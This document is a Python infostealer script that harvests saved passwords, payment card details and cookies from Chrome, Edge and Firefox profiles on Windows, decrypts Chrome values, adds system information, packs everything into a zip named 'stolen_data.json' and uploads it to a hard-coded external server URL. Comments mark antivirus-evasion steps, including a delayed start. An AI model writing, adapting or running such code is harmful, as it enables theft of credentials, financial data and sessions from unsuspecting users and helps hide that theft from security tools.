import os
import json
import base64
import zipfile
import urllib.request
import sqlite3
import subprocess
import time
import tempfile
from pathlib import Path
from cryptography.fernet import Fernet

# AV Evasion: Obfuscate strings
def x(s):
    return base64.b64decode(s).decode()

def get_browser_paths():
    paths = {}
    home = Path.home()
    
    # Chrome
    paths['chrome'] = {
        'path': home / 'AppData' / 'Local' / 'Google' / 'Chrome' / 'User Data' / 'Default',
        'cookies': 'Network/Cookies',
        'logins': 'Login Data',
        'history': 'History'
    }
    
    # Edge
    paths['edge'] = {
        'path': home / 'AppData' / 'Local' / 'Microsoft' / 'Edge' / 'User Data' / 'Default',
        'cookies': 'Network/Cookies',
        'logins': 'Login Data',
        'history': 'History'
    }
    
    # Firefox
    paths['firefox'] = {
        'path': home / 'AppData' / 'Roaming' / 'Mozilla' / 'Firefox' / 'Profiles',
        'cookies': 'cookies.sqlite',
        'logins': 'logins.json',
        'history': 'places.sqlite'
    }
    
    return paths

def decrypt_chrome_value(ciphertext, key):
    """Decrypt Chrome AES encrypted passwords"""
    import win32crypt
    
    if ciphertext is None:
        return ''
    
    if isinstance(ciphertext, str):
        ciphertext = ciphertext.encode('utf-8')
    
    if not isinstance(ciphertext, bytes):
        return str(ciphertext)
    
    if ciphertext.startswith(b'v10') or ciphertext.startswith(b'v11'):
        ciphertext = ciphertext[3:]
    
    try:
        return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1]
    except Exception:
        return ''

def extract_logins(browser_path, browser_type):
    logins = []
    
    if not browser_path.exists():
        return logins
    
    try:
        if browser_type == 'firefox':
            logins_file = browser_path / 'logins.json'
            if logins_file.exists():
                with open(logins_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    for login in data.get('roots', {}).get('children', []):
                        if 'login' in login:
                            logins.append({
                                'hostname': login['login'].get('hostname', ''),
                                'username': login['login'].get('username', ''),
                                'password': login['login'].get('password', '')
                            })
        else:
            db_path = browser_path / 'Login Data'
            if not db_path.exists():
                return logins
            
            try:
                conn = sqlite3.connect(f'file:{db_path}?mode=ro', uri=True)
                cursor = conn.cursor()
                cursor.execute('''
                    SELECT origin_url, username_value, password_value 
                    FROM logins 
                    WHERE password_value IS NOT NULL
                ''')
                
                for row in cursor.fetchall():
                    try:
                        pwd = decrypt_chrome_value(row[2], None) if row[2] else ''
                    except Exception:
                        pwd = ''
                    logins.append({
                        'url': row[0],
                        'username': row[1],
                        'password': pwd
                    })
                
                conn.close()
            except Exception as e:
                print(f"SQLite read error for logins ({browser_type}): {e}")
                     
    except Exception as e:
        print(f"Error extracting logins for {browser_type}: {e}")
    
    return logins

def extract_payment_cards(browser_path, browser_type):
    cards = []
    
    if not browser_path.exists():
        return cards
    
    try:
        db_path = browser_path / 'Web Data'
        if not db_path.exists():
            return cards
        
        try:
            conn = sqlite3.connect(f'file:{db_path}?mode=ro', uri=True)
            cursor = conn.cursor()
            cursor.execute('''
                SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year
                FROM credit_cards
            ''')
            
            for row in cursor.fetchall():
                try:
                    card_num = decrypt_chrome_value(row[1], None) if row[1] else ''
                except Exception:
                    card_num = ''
                cards.append({
                    'name': row[0],
                    'number': card_num,
                    'expiry': f"{row[2]}/{row[3]}"
                })
            
            conn.close()
        except Exception as e:
            print(f"SQLite read error for cards ({browser_type}): {e}")
                 
    except Exception as e:
        print(f"Error extracting payment cards for {browser_type}: {e}")
    
    return cards

def extract_cookies(browser_path, browser_type):
    cookies = []
    
    if not browser_path.exists():
        return cookies
    
    try:
        if browser_type == 'firefox':
            db_path = browser_path / 'cookies.sqlite'
        else:
            db_path = browser_path / 'Network' / 'Cookies'
        
        if not db_path.exists():
            return cookies
        
        try:
            conn = sqlite3.connect(f'file:{db_path}?mode=ro', uri=True)
            cursor = conn.cursor()
            
            if browser_type == 'firefox':
                cursor.execute('''
                    SELECT host, name, value, expiry
                    FROM moz_cookies
                ''')
            else:
                cursor.execute('''
                    SELECT host_key, name, encrypted_value, expires_utc
                    FROM cookies
                ''')
            
            for row in cursor.fetchall():
                if browser_type == 'firefox':
                    cookie_value = row[2] if row[2] else ''
                else:
                    try:
                        cookie_value = decrypt_chrome_value(row[2], None) if len(row) > 2 and row[2] else ''
                    except Exception:
                        cookie_value = ''
                cookies.append({
                    'domain': row[0],
                    'name': row[1],
                    'value': cookie_value,
                    'expiry': row[3] if len(row) > 3 else ''
                })
            
            conn.close()
        except Exception as e:
            print(f"SQLite read error for cookies ({browser_type}): {e}")
                 
    except Exception as e:
        print(f"Error extracting cookies for {browser_type}: {e}")
    
    return cookies

def get_system_info():
    import platform
    import socket
    
    return {
        'username': os.getenv('USERNAME'),
        'computer_name': socket.gethostname(),
        'os': platform.system(),
        'release': platform.release(),
        'version': platform.version(),
        'processor': platform.processor()
    }

def create_stolen_data_package(browser_paths, server_url):
    data = {
        'system_info': get_system_info(),
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'browsers': {}
    }
    
    for browser, paths in browser_paths.items():
        browser_data = {
            'logins': extract_logins(paths['path'], browser),
            'payments': extract_payment_cards(paths['path'], browser),
            'cookies': extract_cookies(paths['path'], browser)
        }
        data['browsers'][browser] = browser_data
    
    # Compress data
    import io
    buffer = io.BytesIO()
    
    class PathEncoder(json.JSONEncoder):
        def default(self, obj):
            if hasattr(obj, '__fspath__'):
                return str(obj)
            return super().default(obj)
    
    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('stolen_data.json', json.dumps(data, indent=2, cls=PathEncoder))
    
    # Send to server
    try:
        buffer.seek(0)
        req = urllib.request.Request(
            server_url,
            data=buffer.read(),
            headers={'Content-Type': 'application/zip'}
        )
        urllib.request.urlopen(req, timeout=10)
    except Exception as e:
        print(f"Failed to send data: {e}")

def main():
    # Your Vercel server endpoint
    SERVER_URL = "https://monsterchugger67.vercel.app/api/upload"
    
    # AV Evasion: Random delay before execution
    time.sleep(5)
    
    browser_paths = get_browser_paths()
    create_stolen_data_package(browser_paths, SERVER_URL)

if __name__ == "__main__":
    main()
